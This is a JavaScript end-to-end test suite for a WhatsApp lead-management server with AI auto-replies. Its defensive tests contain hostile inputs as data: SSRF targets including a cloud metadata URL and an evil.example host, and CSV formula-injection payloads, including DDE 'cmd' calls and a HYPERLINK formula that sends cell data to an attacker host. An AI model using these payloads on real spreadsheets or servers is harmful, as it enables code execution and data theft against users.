// End-to-end test with mocks: boots the server (WA_MOCK, AI_MOCK, in-memory sheet) and walks the whole flow.
// Run: npm test
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';

const APP_SECRET = 'test-app-secret-0123456789';

const PORT = 18000 + Math.floor(Math.random() * 1000);
const BASE = `http://localhost:${PORT}`;
const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'leaddesk-test-'));
const server = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', 'src/server.js'], {
  env: { ...process.env, PORT, DATA_DIR: dataDir, WA_MOCK: '1', AI_MOCK: '1', SHEETS_PROVIDER: 'memory', SCHEDULER_ENABLED: '0', PUBLIC_URL: BASE, NODE_ENV: 'test', META_APP_SECRET: APP_SECRET, BACKUP_ENABLED: '0' },
  stdio: ['ignore', 'pipe', 'pipe'],
});
let logs = '';
server.stdout.on('data', d => { logs += d; });
server.stderr.on('data', d => { logs += d; });

let cookie = '';
async function api(p, { method = 'GET', body } = {}) {
  const res = await fetch(BASE + '/api' + p, { method, headers: { 'X-Requested-With': 'fetch', 'Content-Type': 'application/json', Cookie: cookie }, body: body ? JSON.stringify(body) : undefined });
  const sc = res.headers.get('set-cookie'); if (sc) cookie = sc.split(';')[0];
  const json = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(`${method} ${p} → ${res.status}: ${json.error}`);
  return json;
}
// Post to the public webhook the way Meta does: signed with the app secret.
async function waPost(body, { secret = APP_SECRET, sign = true } = {}) {
  const raw = JSON.stringify(body);
  const headers = { 'Content-Type': 'application/json' };
  if (sign) headers['X-Hub-Signature-256'] = 'sha256=' + crypto.createHmac('sha256', secret).update(raw).digest('hex');
  return fetch(BASE + '/webhook', { method: 'POST', headers, body: raw });
}
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
async function waitFor(fn, { timeout = 5000, every = 100 } = {}) { const t0 = Date.now(); for (;;) { const v = await fn(); if (v) return v; if (Date.now() - t0 > timeout) throw new Error('timeout waiting'); await sleep(every); } }

let passed = 0;
const test = async (name, fn) => { try { await fn(); passed++; console.log('  ✓', name); } catch (e) { console.log('  ✗', name, '\n    ', e.message); process.exitCode = 1; } };

try {
  await waitFor(async () => { try { return (await fetch(BASE + '/health')).ok; } catch { return false; } }, { timeout: 10000 });
  console.log('Server up on', BASE);

  await test('first-run setup creates the admin and signs in', async () => {
    const b = await api('/bootstrap'); assert.equal(b.needsSetup, true);
    const r = await api('/setup', { method: 'POST', body: { name: 'Hemant', email: 'admin@test.local', password: 'password123' } });
    assert.equal(r.user.role, 'admin');
    assert.ok(cookie.startsWith('ld_sid='));
    // Reactive replies default to TEST for safety; the functional tests below assert real delivery.
    await api('/settings', { method: 'PUT', body: { reply_mode: 'live' } });
  });
  await test('login is rate-limited and rejects bad passwords', async () => {
    await assert.rejects(api('/login', { method: 'POST', body: { email: 'admin@test.local', password: 'wrong' } }), /401/);
  });
  await test('CSRF header is required for mutations', async () => {
    const res = await fetch(BASE + '/api/leads', { method: 'POST', headers: { 'Content-Type': 'application/json', Cookie: cookie }, body: '{}' });
    assert.equal(res.status, 403);
  });
  await test('sheet import creates leads with normalised numbers and mapped ad-form answers', async () => {
    const r = await api('/sheet/import', { method: 'POST' });
    assert.equal(r.result.created, 5);
    const { rows } = await api('/leads?limit=50');
    const meera = rows.find(l => l.full_name === 'Meera Iyer'); assert.equal(meera.wa_number, '+919000000044'); // stray 0 fixed
    const sameer = rows.find(l => l.full_name === 'Sameer Khan'); assert.equal(sameer.wa_number, '+919000000005'); // bare 10 digits (phone_number fallback)
    const arjun = rows.find(l => l.full_name === 'Arjun Reddy'); assert.equal(arjun.corridor, 'kokapet / neopolis'); assert.equal(arjun.budget, '2cr to 2.5cr'); assert.equal(arjun.status, 'CREATED'); assert.equal(arjun.sheet_row, 4);
  });
  await test('re-import is idempotent', async () => { const r = await api('/sheet/import', { method: 'POST' }); assert.equal(r.result.created, 0); });

  let arjun;
  await test('inbound → AI reply → lead qualifies, and the AI keeps replying until a human takes over', async () => {
    await api('/wa/simulate-inbound', { method: 'POST', body: { from: '+919000000001', name: 'Arjun Reddy', text: 'Hi, I saw your ad. Is a 3 BHK in Kokapet available around 2 Cr?' } });
    let d = await waitFor(async () => { const d = await api('/leads/3'); return d.messages.length >= 2 ? d : null; });
    arjun = d.lead;
    assert.equal(d.messages[0].direction, 'in'); assert.equal(d.messages[1].sender, 'ai'); assert.equal(d.messages[1].status, 'sent');
    // Lead is flagged for sales, but the AI is NOT muted — mode stays 'ai' (item: bot never auto-hands-off).
    assert.equal(arjun.status, 'PROSPECT'); assert.equal(arjun.mode, 'ai'); assert.equal(arjun.qualified, true);
    assert.ok(d.history.some(h => h.type === 'lead.handoff.ai'));
    // A second message still gets an AI reply — the bot did not go silent after qualifying.
    const n = d.messages.length;
    await api('/wa/simulate-inbound', { method: 'POST', body: { from: '+919000000001', text: 'Also, is covered parking included?' } });
    d = await waitFor(async () => { const dd = await api('/leads/3'); return dd.messages.length > n && dd.messages.at(-1).sender === 'ai' ? dd : null; });
    assert.equal(d.messages.at(-1).sender, 'ai');
    // Only an explicit human take-over switches the lead to human mode (sets up the tests below).
    const t = await api('/leads/3/takeover', { method: 'POST' });
    assert.equal(t.lead.mode, 'human');
  });
  await test('duplicate webhook delivery is ignored', async () => {
    const before = (await api('/leads/3')).messages.length;
    const body = { object: 'whatsapp_business_account', entry: [{ changes: [{ value: { metadata: { phone_number_id: 'MOCK' }, contacts: [{ wa_id: '919000000001', profile: { name: 'Arjun' } }], messages: [{ from: '919000000001', id: 'wamid.DUP1', timestamp: '1', type: 'text', text: { body: 'hello again' } }] } }] }] };
    for (let i = 0; i < 2; i++) await waPost(body);
    await sleep(300);
    const after = (await api('/leads/3')).messages.length;
    assert.equal(after, before + 1); // human mode → no AI reply, and the duplicate was dropped
  });
  await test('human mode: no AI reply, unread count rises, human can reply inside the 24h window', async () => {
    let d = await api('/leads/3'); assert.ok(d.lead.unread_count >= 1); assert.equal(d.lead.window_open, true);
    const r = await api('/leads/3/messages', { method: 'POST', body: { text: 'Hi Arjun, Hemant here. Shall we plan a visit this weekend?' } });
    assert.equal(r.message.sender, 'human'); assert.equal(r.message.status, 'sent');
    await api('/leads/3/read', { method: 'POST' }); d = await api('/leads/3'); assert.equal(d.lead.unread_count, 0);
  });
  await test('delivery status webhook updates the message', async () => {
    const d = await api('/leads/3'); const last = d.messages.at(-1);
    const body = { object: 'whatsapp_business_account', entry: [{ changes: [{ value: { statuses: [{ id: last.wa_message_id, status: 'read', timestamp: '1' }] } }] }] };
    await waPost(body);
    await sleep(200);
    assert.equal((await api('/leads/3')).messages.at(-1).status, 'read');
  });
  await test('hand back to AI resumes automatic replies', async () => {
    await api('/leads/3/handback', { method: 'POST' });
    await api('/wa/simulate-inbound', { method: 'POST', body: { from: '+919000000001', text: 'Do you have home loan support?' } });
    const d = await waitFor(async () => { const d = await api('/leads/3'); return d.messages.at(-1).sender === 'ai' ? d : null; });
    assert.equal(d.messages.at(-1).meta.intent, 'loan');
  });
  await test('opt-out keyword stops everything', async () => {
    await api('/wa/simulate-inbound', { method: 'POST', body: { from: '+919000000003', name: 'Ravi', text: 'STOP, not interested' } });
    const d = await waitFor(async () => { const d = await api('/leads/2'); return d.lead.status === 'OPTED_OUT' ? d : null; });
    assert.equal(d.lead.opted_out, true); assert.equal(d.messages.at(-1).sender, 'system');
  });
  await test('AI review: flag and approve', async () => {
    const { rows } = await api('/review?filter=unreviewed'); assert.ok(rows.length >= 2);
    const r = await api(`/messages/${rows[0].id}/review`, { method: 'POST', body: { review: 'bad', note: 'Too generic' } });
    assert.equal(r.message.review, 'bad');
    const c = (await api('/review?filter=flagged')).counts; assert.equal(c.flagged, 1);
  });
  await test('follow-up scheduler respects send mode, sends templates and advances status', async () => {
    let r = await api('/followups/run', { method: 'POST' }); assert.equal(r.result.skipped, 'send_mode off');
    await api('/settings', { method: 'PUT', body: { send_mode: 'test', test_recipients: '+919000000002', send_window_start: 0, send_window_end: 24 } });
    r = await api('/followups/run', { method: 'POST' }); assert.equal(r.result.sent, 1);
    const d = await api('/leads/1'); assert.equal(d.lead.status, 'CONTACTED'); assert.equal(d.lead.followup_stage, 1); assert.equal(d.messages[0].type, 'template'); assert.equal(d.messages[0].template_name, 'neopolis_journey_d0_intro'); assert.ok(d.messages[0].body.startsWith('Hello Asha'));
    r = await api('/followups/run', { method: 'POST' }); assert.equal(r.result.sent, 0); // day-2 step not due yet
    const sys = await api('/system'); assert.equal(sys.followups.journey.length, 6); assert.equal(sys.followups.journey.at(-1).day, 13);
    const sub = await api('/wa/submit-templates', { method: 'POST' }); assert.equal(sub.results.length, 6); // mock WABA already has none of these → all "submitted"
    assert.ok(sub.results.every(x => x.status !== 'error'), JSON.stringify(sub.results));
  });
  await test('sheet mirror queue writes lead_status + last_reply and Client Replies rows', async () => {
    const r = await api('/sheet/flush', { method: 'POST' }); assert.equal(r.result.failed, 0); assert.equal(r.result.pending, 0);
    const sys = await api('/system'); assert.ok(sys.sheet.lastWrite);
  });
  await test('bulk actions, CSV export, team management, settings guard', async () => {
    const r = await api('/leads/bulk', { method: 'POST', body: { ids: [4, 5], action: 'pause' } }); assert.equal(r.count, 2);
    assert.equal((await api('/leads/4')).lead.outreach_paused, true);
    const csv = await (await fetch(BASE + '/api/export/leads.csv', { headers: { Cookie: cookie } })).text(); assert.ok(csv.split('\n').length >= 6);
    const u = await api('/users', { method: 'POST', body: { name: 'Sales Agent', email: 'agent@test.local', wa_number: '9000000006', password: 'password123', role: 'agent' } }); assert.equal(u.user.role, 'agent'); assert.equal(u.user.wa_number, '+919000000006'); // member WhatsApp captured + normalised
    const adminCookie = cookie; cookie = '';
    await api('/login', { method: 'POST', body: { email: 'agent@test.local', password: 'password123' } });
    await assert.rejects(api('/settings', { method: 'PUT', body: { send_mode: 'live' } }), /403/);
    await api('/leads/3/takeover', { method: 'POST' }); // agents can work leads
    cookie = adminCookie;
    assert.equal((await api('/leads/3')).lead.status, 'IN_SALES');
  });
  await test('webhook rejects unsigned and tampered posts', async () => {
    const body = { object: 'whatsapp_business_account', entry: [{ changes: [{ value: { metadata: { phone_number_id: 'MOCK' }, contacts: [{ wa_id: '919000000199', profile: { name: 'Spoof' } }], messages: [{ from: '919000000199', id: 'wamid.SPOOF1', timestamp: '1', type: 'text', text: { body: 'injected' } }] } }] }] };
    const unsigned = await waPost(body, { sign: false });
    assert.equal(unsigned.status, 403);                       // no signature → rejected
    const tampered = await waPost(body, { secret: 'wrong-secret' });
    assert.equal(tampered.status, 403);                       // bad signature → rejected
    await sleep(200);
    const { rows } = await api('/leads?limit=200');
    assert.ok(!rows.some(l => l.wa_number === '+919000000001'), 'spoofed post must not create a lead');
  });

  await test('reply mode holds automatic sends to numbers outside the test list', async () => {
    await api('/settings', { method: 'PUT', body: { reply_mode: 'test', test_recipients: '+910000000009' } });
    await api('/wa/simulate-inbound', { method: 'POST', body: { from: '+919888877777', name: 'Held Lead', text: 'Is a 2 BHK available in Tellapur?' } });
    const lead = await waitFor(async () => (await api('/leads?limit=200')).rows.find(l => l.wa_number === '+919888877777'));
    const d = await waitFor(async () => { const d = await api(`/leads/${lead.id}`); return d.messages.length >= 2 ? d : null; });
    const out = d.messages.filter(m => m.direction === 'out');
    assert.equal(out.length, 1);
    assert.equal(out[0].status, 'blocked');                   // recorded, but never delivered
    assert.match(out[0].error, /Reply mode is TEST/);
    await api('/settings', { method: 'PUT', body: { reply_mode: 'live', test_recipients: '' } });
  });

  await test('ops: health report, spend counters and on-demand backup', async () => {
    const h = await api('/ops/health?probe=0');
    assert.equal(h.webhook.auth, 'signature');                // signature enforcement is active
    assert.ok(Array.isArray(h.issues));
    const s2 = await api('/ops/spend');
    assert.ok(s2.spend.sendCap > 0);
    const b = await api('/ops/backups/run', { method: 'POST' });
    assert.equal(b.ok, true);
    const list = await api('/ops/backups');
    assert.ok(list.files.length >= 1);
    const ready = await fetch(BASE + '/health/ready');
    assert.ok([200, 503].includes(ready.status));
    assert.ok(typeof (await ready.json()).ok === 'boolean');
  });

  await test('send/reply modes reject unrecognised values (no silent fail-open to live)', async () => {
    for (const bad of ['banana', 'LIVE', '']) {
      await assert.rejects(api('/settings', { method: 'PUT', body: { reply_mode: bad } }), /400/, `reply_mode=${JSON.stringify(bad)} must be rejected`);
      await assert.rejects(api('/settings', { method: 'PUT', body: { send_mode: bad } }), /400/, `send_mode=${JSON.stringify(bad)} must be rejected`);
    }
    const { settings } = await api('/settings');
    assert.equal(settings.reply_mode, 'live');   // unchanged by the rejected writes
  });

  await test('Apps Script URL is pinned to Google hosts (SSRF guard)', async () => {
    for (const bad of ['http://localhost:8080/exec', 'http://169.254.169.254/latest/meta-data', 'https://evil.example.com/exec']) {
      await assert.rejects(api('/sheet/connect', { method: 'POST', body: { method: 'appsscript', appsScriptUrl: bad } }), /400/, `${bad} must be rejected`);
    }
  });

  await test('CSV export neutralises spreadsheet formulas but keeps phone numbers readable', async () => {
    // A lead controls their own WhatsApp profile name. These are the payloads that would run
    // when a salesperson opens the export in Excel.
    const attacks = [
      { name: `=cmd|'/c calc'!A1`, num: '+919000000101' },
      { name: '=HYPERLINK("http://evil.example/"&A1,"Click")', num: '+919000000102' },
      { name: '@SUM(1+1)*cmd|', num: '+919000000103' },
      { name: '+cmd|\'/c calc\'!A0', num: '+919000000104' },
    ];
    for (const a of attacks) await api('/leads', { method: 'POST', body: { full_name: a.name, wa_number: a.num } });
    const res = await fetch(BASE + '/api/export/leads.csv', { headers: { cookie } });
    assert.equal(res.status, 200);
    // Read raw bytes: fetch().text() decodes UTF-8 and strips a leading BOM, so the BOM is
    // only visible on the wire — which is exactly where Excel looks for it.
    const raw = new Uint8Array(await res.arrayBuffer());
    assert.deepEqual([...raw.slice(0, 3)], [0xEF, 0xBB, 0xBF], 'export should carry a UTF-8 BOM for Excel');
    const csv = new TextDecoder('utf-8').decode(raw);
    for (const line of csv.split('\r\n').slice(1)) {
      for (const cell of line.match(/"(?:[^"]|"")*"/g) || []) {
        const v = cell.slice(1, -1).replace(/""/g, '"');
        assert.ok(!/^[=@]/.test(v), `cell would be evaluated by Excel: ${v}`);
        assert.ok(!(/^[+\-\t\r]/.test(v) && /[A-Za-z|!(]/.test(v)), `cell would be evaluated by Excel: ${v}`);
      }
    }
    for (const a of attacks) assert.ok(csv.includes("'" + a.name.replace(/"/g, '""')), `payload should survive as inert text: ${a.name}`);
    assert.ok(csv.includes('"+919000000101"'), 'plain phone numbers must not be mangled');
  });

  await test('security headers are present on every response', async () => {
    const res = await fetch(BASE + '/', { headers: { cookie } });
    const csp = res.headers.get('content-security-policy') || '';
    for (const d of ["default-src 'self'", "script-src 'self'", "object-src 'none'", "frame-ancestors 'none'", "base-uri 'none'"])
      assert.ok(csp.includes(d), `CSP missing ${d}`);
    assert.ok(!/unsafe-eval|unsafe-inline'.*script/.test(csp), 'script-src must not allow unsafe-inline/eval');
    assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(res.headers.get('x-frame-options'), 'DENY');
  });

  await test('list limits are clamped (no unbounded query from a crafted URL)', async () => {
    const r = await api('/leads?limit=99999999999&offset=-5');
    assert.ok(Array.isArray(r.rows));
    assert.ok(r.rows.length <= 100000);
  });

  await test('webhook verification handshake', async () => {
    const res = await fetch(BASE + '/webhook?hub.mode=subscribe&hub.verify_token=neopolis-leaddesk-verify&hub.challenge=12345'); assert.equal(await res.text(), '12345');
    const bad = await fetch(BASE + '/webhook?hub.mode=subscribe&hub.verify_token=nope&hub.challenge=1'); assert.equal(bad.status, 403);
  });
  console.log(`\n${passed} tests passed${process.exitCode ? ' (with failures)' : ''}`);
} catch (e) {
  console.error('FATAL', e); process.exitCode = 1;
} finally {
  server.kill();
  if (process.exitCode) console.log('\n--- server log ---\n' + logs.slice(-4000));
  fs.rmSync(dataDir, { recursive: true, force: true });
}
